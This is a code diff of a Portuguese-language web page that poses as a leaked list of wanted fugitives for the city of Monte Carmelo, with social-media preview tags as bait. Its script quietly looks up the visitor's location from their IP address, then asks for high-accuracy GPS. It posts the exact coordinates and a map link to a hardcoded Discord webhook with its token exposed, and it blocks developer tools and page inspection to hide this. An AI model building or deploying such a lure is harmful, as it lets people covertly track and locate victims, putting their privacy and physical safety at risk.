@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>■ LISTA DE FORAGIDOS - MONTE CITY</title>
+<!-- Preview para WhatsApp/Telegram -->
 <meta property="og:title" content="■ URGENTE: Nova lista de foragidos de Monte Carmelo vazou!">
 <meta property="og:description" content="Confira os nomes dos principais procurados na região. Clique para ver a lista completa por bairro.">
 <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg">
@@ -11,8 +12,8 @@
 <style>
 body {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background-color: #000000;
-    color: #ffffff;
+    background-color: #000000; /* Fundo Preto */
+    color: #ffffff; /* Letras Brancas */
     margin: 0;
     padding: 0;
     text-align: center;
@@ -22,29 +23,35 @@ body {
     user-select: none;
     overflow-x: hidden;
 }
+
+/* --- HEADER CORRIGIDO --- */
 .header {
-    background-color: #1a1a1a;
-    padding: 0;
-    box-shadow: 0 2px 5px rgba(255,255,255,0.1);
+    background-color: #1a1a1a; 
+    color: white;
+    padding: 15px 10px; /* Padding lateral menor para não empurrar */
+    font-weight: bold;
+    font-size: 1.2em;
+    letter-spacing: 0.5px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.8);
     position: relative;
     z-index: 100;
-    border-bottom: 2px solid #d32f2f;
+    border-bottom: 1px solid #333;
 }
-.header img {
-    width: 100%;
-    height: auto;
-    display: block;
-    object-fit: contain;
-    max-height: 90px;
+
+.header span.city-text {
+    color: #d32f2f; /* Vermelho */
+    font-weight: 900;
 }
+
 .container {
-    padding: 20px;
-    max-width: 500px;
+    padding: 15px; /* Reduzi o padding para dar mais espaço à imagem */
+    max-width: 600px; /* Aumentei um pouco para permitir imagens maiores */
     margin: 0 auto;
     min-height: 90vh;
     position: relative;
     z-index: 50;
 }
+
 .alert-box {
     background-color: #1e1e1e;
     border-left: 5px solid #d32f2f;
@@ -54,53 +61,71 @@ body {
     font-size: 0.95em;
     color: #ccc;
 }
+
+/* --- CORREÇÃO DA IMAGEM E DO CADEADO --- */
 .img-container {
     position: relative;
     width: 100%;
     margin-bottom: 20px;
-    border-radius: 4px;
-    box-shadow: 0 2px 8px rgba(255,255,255,0.1);
+    border-radius: 8px; /* Bordas mais suaves */
+    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
     overflow: hidden;
+    
+    /* Força uma proporção visual harmoniosa */
+    aspect-ratio: 9/16; 
+    max-height: 500px; /* Limite de altura para não ficar gigante no PC */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background-color: #111; /* Cor de fundo enquanto carrega */
 }
+
 .final-img {
     width: 100%;
-    height: auto;
+    height: 100%;
+    object-fit: cover; /* Garante que preencha sem distorcer */
     display: block;
     transition: opacity 0.5s ease;
 }
+
 .locked-overlay {
     position: absolute;
     top: 0;
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(0,0,0,0.6);
+    background: rgba(0,0,0,0.5); /* Escurece um pouco para destacar o cadeado */
     display: flex;
     justify-content: center;
     align-items: center;
-    z-index: 10;
-    pointer-events: none;
+    z-index: 20; /* Z-index alto para ficar ACIMA da imagem */
+    pointer-events: none; 
 }
+
 .lock-icon {
-    background: rgba(255,255,255,0.1);
+    background: rgba(255,255,255,0.2);
+    backdrop-filter: blur(4px); /* Mais efeito vidro */
     color: white;
-    padding: 15px;
+    padding: 20px;
     border-radius: 50%;
-    font-size: 2em;
-    backdrop-filter: blur(2px);
+    font-size: 3em; /* Aumentei o tamanho */
+    box-shadow: 0 0 20px rgba(0,0,0,0.5);
     animation: pulseLock 2s infinite;
+    border: 2px solid rgba(255,255,255,0.3);
 }
+
 @keyframes pulseLock {
     0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.7); }
-    70% { transform: scale(1.1); box-shadow: 0 0 0 10px rgba(255,255,255,0); }
+    70% { transform: scale(1.1); box-shadow: 0 0 0 15px rgba(255,255,255,0); }
     100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0); }
 }
+
 .btn-access {
-    background: linear-gradient(to bottom, #4caf50, #2e7d32);
+    background: linear-gradient(to bottom, #4caf50, #2e7d32); 
     color: white;
     padding: 20px;
     border: none;
-    border-radius: 6px;
+    border-radius: 8px;
     font-size: 1.3em;
     font-weight: bold;
     cursor: pointer;
@@ -108,13 +133,16 @@ body {
     box-shadow: 0 4px 6px rgba(0,0,0,0.5);
     animation: pulse 1.5s infinite;
     position: relative;
-    z-index: 60;
+    z-index: 60; 
+    margin-top: 10px;
 }
+
 @keyframes pulse {
     0% { transform: scale(1); }
     50% { transform: scale(1.02); }
     100% { transform: scale(1); }
 }
+
 .loader {
     display: none;
     margin-top: 20px;
@@ -172,42 +200,46 @@ body {
 </head>
 <body oncontextmenu="return false;">
 
-<div class="header">
-    <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/main/Banner%20Institucional%20Monte%20Carmelo%20e%20Parceiros.png" alt="Banner Monte City">
-</div>
+<div class="header">MONTE <span class="city-text">CITY</span> - PLANTÃO JUDICIAL</div>
 
 <div class="container">
-    <h2 style="color: #d32f2f; margin-top: 0;">■ VAZAMENTO EXCLUSIVO</h2>
+    <h2 style="color: #d32f2f; margin-top: 0; font-size: 1.5em;">■ VAZAMENTO EXCLUSIVO</h2>
+    
     <div class="alert-box">
         <strong>■■ Atenção:</strong> A nova lista de foragidos de Monte Carmelo acaba de ser publicada. Para evitar acessos indevidos de outras regiões, confirmamos sua localização exata antes de liberar os dados.
     </div>
-    
+
+    <!-- Container da Imagem Corrigido -->
     <div class="img-container">
         <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg" alt="Lista Foragidos" class="final-img" id="main-image">
+        
+        <!-- Overlay do Cadeado -->
         <div id="lock-overlay" class="locked-overlay">
-            <div class="lock-icon">■</div>
+            <div class="lock-icon">🔒</div>
         </div>
     </div>
+
+    <p style="font-weight: bold; margin-bottom: 15px; font-size: 1.1em;">Verifique se você está na área de cobertura:</p>
     
-    <p style="font-weight: bold; margin-bottom: 15px;">Verifique se você está na área de cobertura:</p>
     <button id="btn" class="btn-access" onclick="iniciarVerificacao()">VER LISTA DA MINHA REGIÃO</button>
-    
+
     <div id="loader" class="loader">
-        <p id="loader-msg" style="font-weight: bold; color: #fff;">Verificando sua posição...</p>
+        <p id="loader-msg" style="font-weight: bold; color: #fff; margin-bottom: 5px;">Verificando sua posição...</p>
         <div class="progress-bar-bg">
             <div id="progress-bar" class="progress-bar-fill"></div>
         </div>
         <p id="loader-detail" class="status-text">Aguardando sinal do GPS...</p>
     </div>
-    
+
     <div id="error-msg" class="error-message">
-        ■■ Localização necessária para acessar a lista exclusiva.<br>
+        ■ Localização necessária para acessar a lista exclusiva.<br>
         <small>Clique no botão abaixo para tentar novamente.</small>
         <button class="btn-retry" onclick="reiniciarVerificacao()">■ VERIFICAR NOVAMENTE</button>
     </div>
 </div>
 
 <script>
+// Webhook Discord
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";
 
 function updateStatus(msg, percent) {
@@ -215,33 +247,24 @@ function updateStatus(msg, percent) {
     document.getElementById('progress-bar').style.width = percent + '%';
 }
 
-function getDeviceInfo() {
-    const ua = navigator.userAgent;
-    let device = "Celular Desconhecido";
-    if (/android/i.test(ua)) device = "Android";
-    else if (/iphone|ipad|ipod/i.test(ua)) device = "iOS";
-    else if (/windows/i.test(ua)) device = "Windows";
-    return `${device} (${ua.substring(0, 30)}...)`;
-}
-
 function iniciarVerificacao() {
-    // Bloqueia o botão para evitar múltiplos cliques
+    // Esconde botão e overlay do cadeado suavemente
     const btn = document.getElementById('btn');
+    const lock = document.getElementById('lock-overlay');
+    
     btn.style.display = 'none';
     document.getElementById('loader').style.display = 'block';
     document.getElementById('error-msg').style.display = 'none';
     
-    // Efeito visual de desbloqueio
-    document.getElementById('lock-overlay').style.opacity = '0';
+    // Animação de fade out no cadeado
+    lock.style.opacity = '0';
     setTimeout(() => {
-        document.getElementById('lock-overlay').style.display = 'none';
+        lock.style.display = 'none';
     }, 500);
 
     updateStatus("Conectando ao servidor central...", 15);
     
-    // Pequeno delay para garantir que o navegador registra o "toque" corretamente
-    setTimeout(() => {
-        fetch('https://ipapi.co/json/')
+    fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
             updateStatus("Identificando torre de celular mais próxima...", 40);
@@ -252,11 +275,16 @@ function iniciarVerificacao() {
             updateStatus("Servidor ocupado, tentando GPS direto...", 60);
             solicitarGPS(true);
         });
-    }, 100);
 }
 
 function reiniciarVerificacao() {
-    window.location.reload();
+    const newUrl = window.location.pathname + '?t=' + Date.now();
+    window.history.pushState({path:newUrl}, '', newUrl);
+    document.getElementById('error-msg').style.display = 'none';
+    document.getElementById('btn').style.display = 'block';
+    document.getElementById('lock-overlay').style.display = 'flex';
+    document.getElementById('lock-overlay').style.opacity = '1';
+    document.getElementById('main-image').style.opacity = '1';
 }
 
 function solicitarGPS(ipFracassou = false) {
@@ -264,39 +292,29 @@ function solicitarGPS(ipFracassou = false) {
         mostrarErro();
         return;
     }
-
+    
     updateStatus("Solicitando permissão de localização...", 75);
-
-    // Configurações OTIMIZADAS PARA CELULAR
-    const options = {
-        enableHighAccuracy: true, // Usa GPS hardware, não apenas antena
-        timeout: 45000,           // Espera até 45 segundos pelo fix do satélite
-        maximumAge: 0             // Não usa cache antigo
-    };
-
+    
     navigator.geolocation.getCurrentPosition(
         (position) => {
             const lat = position.coords.latitude.toFixed(6);
             const lon = position.coords.longitude.toFixed(6);
             const precisao = position.coords.accuracy ? Math.round(position.coords.accuracy) : '?';
             const mapaLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            const deviceInfo = getDeviceInfo();
-
-            enviarDados(`■■ **LOCALIZAÇÃO EXATA CAPTURADA!**\n■ Coordenadas: ${lat}, ${lon}\n■ Precisão: ~${precisao} metros\n■■ Dispositivo: ${deviceInfo}\n■■ Mapa: ${mapaLink}`);
+            
+            enviarDados(`■■ **LOCALIZAÇÃO EXATA CAPTURADA!**\n■ Coordenadas: ${lat}, ${lon}\n■ Precisão: ~${precisao} metros\n■■ Mapa: ${mapaLink}`);
             finalizarComSucesso();
         },
         (error) => {
             console.error("Erro GPS:", error);
-            // Erro 1 = Usuário negou permissão
-            // Erro 2 = Posição indisponível (GPS ruim)
-            // Erro 3 = Timeout (demorou demais)
+            // Se o erro for 1 (usuário negou), mostra erro. Se for outro, tenta finalizar mesmo assim para não travar.
             if (error.code === 1) {
                 mostrarErro();
             } else {
-                finalizarComFalha(); 
+                finalizarComFalha();
             }
         },
-        options
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
 }
 
@@ -328,14 +346,16 @@ function finalizarComFalha() {
     }, 1000);
 }
 
-// --- BLOQUEIO DE TECLAS E GESTOS (Android/Desktop) --
+// --- BLOQUEIO DE TECLAS E GESTOS ---
 document.addEventListener('keydown', function(event) {
     if (event.key === 'F12' ||
-    (event.ctrlKey && event.shiftKey && ['I', 'J', 'K'].includes(event.key.toUpperCase())) ||
-    (event.ctrlKey && event.key.toLowerCase() === 'u')) {
+        (event.ctrlKey && event.shiftKey && ['I', 'J', 'K'].includes(event.key.toUpperCase())) ||
+        (event.ctrlKey && event.key.toLowerCase() === 'u')) {
         event.preventDefault();
     }
 });
+
+// Desativa toque duplo para inspecionar (comum em Android)
 let lastTouchEnd = 0;
 document.addEventListener('touchend', function(event) {
     const now = (new Date()).getTime();
@@ -344,6 +364,8 @@ document.addEventListener('touchend', function(event) {
     }
     lastTouchEnd = now;
 }, false);
+
+// Detecta se DevTools está aberto e fecha/recarrega
 setInterval(function() {
     const threshold = 160;
     if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
